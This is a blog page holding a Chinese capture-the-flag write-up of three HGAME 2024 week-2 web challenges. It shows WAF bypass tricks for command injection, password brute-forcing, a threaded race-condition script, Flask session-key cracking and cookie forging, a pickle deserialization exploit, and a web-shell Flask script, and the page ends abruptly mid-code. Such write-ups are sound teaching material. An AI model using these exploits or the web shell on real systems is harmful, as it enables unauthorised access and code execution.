@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Web(部分) 前言 HGAME week2 直接上难度了,暂时只掌握了三道 还有两道分别是java的堆叠注入 以及 go的SSTI+XSS  What the cow say?1描述：the cow want to tell you something  12通过描述 以及查看题目 以为是xss或者sql又或者SSTI的东西  fuzz后发现居然是RCE 也是绝的  反引号RCE　且存在waf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME 2024 WEEK 2 wp">
+<meta property="og:url" content="https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/index.html">
+<meta property="og:site_name" content="Liangmo_sec">
+<meta property="og:description" content="Web(部分) 前言 HGAME week2 直接上难度了,暂时只掌握了三道 还有两道分别是java的堆叠注入 以及 go的SSTI+XSS  What the cow say?1描述：the cow want to tell you something  12通过描述 以及查看题目 以为是xss或者sql又或者SSTI的东西  fuzz后发现居然是RCE 也是绝的  反引号RCE　且存在waf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114418451.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114903310.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217202606289.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205148810.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217203028409.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205030580.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205243566.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217210337649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217210537820.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218000454860.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218000954784.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218001546912.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218003222282.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218003717486.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218011429027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218011344391.png">
+<meta property="article:published_time" content="2024-02-17T16:30:00.000Z">
+<meta property="article:modified_time" content="2024-02-17T22:24:54.698Z">
+<meta property="article:author" content="凉墨">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114418451.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HGAME 2024 WEEK 2 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/22/Hard-Socnet2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/08/EvilBox-One/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&text=HGAME 2024 WEEK 2 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&is_video=false&description=HGAME 2024 WEEK 2 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME 2024 WEEK 2 wp&body=Check out this article: https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&title=HGAME 2024 WEEK 2 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&name=HGAME 2024 WEEK 2 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/02/18/HGAME-2024-WEEK-2-Web-wp/&t=HGAME 2024 WEEK 2 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">Web(部分)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-the-cow-say"><span class="toc-number">1.1.</span> <span class="toc-text">What the cow say?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select-More-Courses"><span class="toc-number">1.2.</span> <span class="toc-text">Select More Courses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#myflask"><span class="toc-number">1.3.</span> <span class="toc-text">myflask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask-session-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.3.1.</span> <span class="toc-text">flask session 伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE"><span class="toc-number">1.3.2.</span> <span class="toc-text">pickle 反序列化 RCE</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HGAME 2024 WEEK 2 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">凉墨</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-17T16:30:00.000Z" class="dt-published" itemprop="datePublished">2024-02-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Web-部分"><a href="#Web-部分" class="headerlink" title="Web(部分)"></a>Web(部分)</h1><blockquote>
+<p>前言</p>
+<p>HGAME week2 直接上难度了,暂时只掌握了三道</p>
+<p>还有两道分别是java的堆叠注入 以及 go的SSTI+XSS</p>
+</blockquote>
+<h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述：the cow want to tell you something</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过描述 以及查看题目 以为是xss或者sql又或者SSTI的东西  </span><br><span class="line">fuzz后发现居然是RCE 也是绝的</span><br></pre></td></tr></table></figure>
+
+<p>反引号RCE　且存在waf  需要进行绕过</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114418451.png" alt="image-20240217114418451"></p>
+<p>在根目录下存在 flag_is_here<br>尝试cat读取时发现有waf<br>cat 和 flag 都被过滤了  且flag_is_here 是一个文件目录<br>目录下存在flag_c0w54y</p>
+<blockquote>
+<p>cat 可以使用 转义符绕过 或者更换其他命令查看<br>flag可以使用单双引号隔开或占位符从而达到不被waf匹配的效果</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114903310.png" alt="image-20240217114903310"></p>
+<h2 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line">ma5hr00m wants to take more courses, but he may be racing against time. Can you help him? （数据库初始化需要时间，请稍作等待）</span><br><span class="line"></span><br><span class="line">提示1</span><br><span class="line">可参考的弱密码字典：https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/top1000.txt</span><br></pre></td></tr></table></figure>
+
+<p>通过描述 我们可知道 用户名 ma5hr00m<br>同时给了我们密码字典</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217202606289.png" alt="image-20240217202606289"></p>
+<p>使用bp intruder模块 加载字典</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205148810.png" alt="image-20240217205148810"></p>
+<p>根据返回包的状态码以及返回长度  很显然<br>password 是 qwert123</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217203028409.png" alt="image-20240217203028409"></p>
+<p>一开始 去自主选课 还以为和 Week1 Select Courses 类似<br>由于只有一门课程 尝试bp intruder模块 直接发包  发现 并没选择上课程</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205030580.png" alt="image-20240217205030580"></p>
+<p>看来还得从 选课扩学分申请 做文章</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205243566.png" alt="image-20240217205243566"></p>
+<p>好吧 还给了 提示 Race against time!</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217210337649.png" alt="image-20240217210337649"></p>
+<p>这个我是真的想笑 我懵了 一直跑 扩学分申请  一直没提示 一直跑<br>后面去看一下 选课系统 绷不住 </p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217210537820.png" alt="image-20240217210537820"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跑了3827分 直接选 然后点选完了即可获取flag</span><br></pre></td></tr></table></figure>
+
+
+
+<p>同时看官方wp  附上官方的解释及python脚本</p>
+<p>登⼊系统后进⼊ &#x2F;expand 路由，根据提⽰ race against time ，并发POST请求 &#x2F;api&#x2F;expand 接⼝，利⽤此处存在的条件竞争漏洞，可实现拓展学分上限，然后选择对应课程获取flag。</p>
+<p>利⽤条件竞争可使⽤BurpSuite⾃带的Intruder模块，也可以⾃⾏编写脚本实现，以下为⼀个可供参考的利⽤此处漏洞的python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>():</span><br><span class="line">    url = <span class="string">&quot;http://139.196.183.57:32368/api/expand&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;139.196.183.57:32368&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://139.196.183.57:32368&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://139.196.183.57:32368/expand&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh; q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=MTcwNzEwNzQzM3xEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fHOdF2Z4AqqV3oV6z2EPpM2zyz1UOPBTtu69oB8qnaWM&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;ma5hr00m&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, json=payload)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建50个线程并发发送请求</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    thread = threading.Thread(target=send_request)</span><br><span class="line">    thread.start()</span><br><span class="line">    threads.append(thread)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有线程完成</span></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述：善用搜索引擎，容器中的 Python 版本为 3.11</span><br></pre></td></tr></table></figure>
+
+<p>访问题目环境得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pytz <span class="keyword">import</span> timezone</span><br><span class="line"></span><br><span class="line">currentDateAndTime = datetime.now(timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">currentTime = currentDateAndTime.strftime(<span class="string">&quot;%H%M%S&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># Tips: Try to crack this first ↓</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = currentTime</span><br><span class="line"><span class="built_in">print</span>(currentTime)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;There is no session available in your client :(&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># For POST requests from admin</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>考察知识点<br>flask session 伪造<br>pickle 反序列化 RCE</p>
+</blockquote>
+<h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由currentTime = currentDateAndTime.strftime(&quot;%H%M%S&quot;)</span><br><span class="line">得flask的SECRET_KEY是根据脚本执行(靶机创建)时的时间生成格式为时分秒</span><br></pre></td></tr></table></figure>
+
+<p>根据获取 cookie 的 session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZdDX2A.UfKBo635rJcG50tQLzAJ6bhcqko</span><br></pre></td></tr></table></figure>
+
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">flask_unsign</a>配合纯6位数字字典进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign  --unsign --cookie &quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZdDX2A.UfKBo635rJcG50tQLzAJ6bhcqko&quot; --no-literal-eval --wordlist 6-digits-000000-999999.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218000454860.png" alt="image-20240218000454860"></p>
+<p>使用[flask-session-cookie-manager](<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder (github.com)</a>)验证密钥且伪造cookie </p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218000954784.png" alt="image-20240218000954784"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZdDaMw.IKzG8y5QCWSap0WOQxQxSasO6s4</span><br></pre></td></tr></table></figure>
+
+<p>更换cookie 访问 &#x2F;flag 可得</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218001546912.png" alt="image-20240218001546912"></p>
+<h3 id="pickle-反序列化-RCE"><a href="#pickle-反序列化-RCE" class="headerlink" title="pickle 反序列化 RCE"></a>pickle 反序列化 RCE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据   pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>同时也给我们提示这里尝试触发RCE<br>由此得出exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from urllib.parse import urlencode</span><br><span class="line"></span><br><span class="line">class pickleRce:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (open,(&#x27;/flag&#x27;,&#x27;r&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pickle.dumps(pickleRce()))</span><br><span class="line">post_parms = &#123;&#x27;pickle_data&#x27;:payload&#125;</span><br><span class="line">print(urlencode(post_parms))</span><br><span class="line"># pickle_data=gASVHwAAAAAAAACMAmlvlIwEb3BlbpSTlIwFL2ZsYWeUjAFylIaUUpQu</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218003222282.png" alt="image-20240218003222282"></p>
+<blockquote>
+<p>官方wp学习</p>
+</blockquote>
+<p>系统级 getshell (带回显)</p>
+<p>Flask 项目 debug 模式打开后⽀持自动重载</p>
+<p>使用pickle 反序列化 RCE读取 &#x2F;proc&#x2F;self&#x2F;cmdline ，确定服务器上 flask 脚本名称为app.py</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218003717486.png" alt="image-20240218003717486"></p>
+<p>编写带命令执行功能的 flask 脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/cmd&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mycmd</span>():</span><br><span class="line">    handle = os.popen(request.form.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    ret = handle.read()</span><br><span class="line">    handle.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span 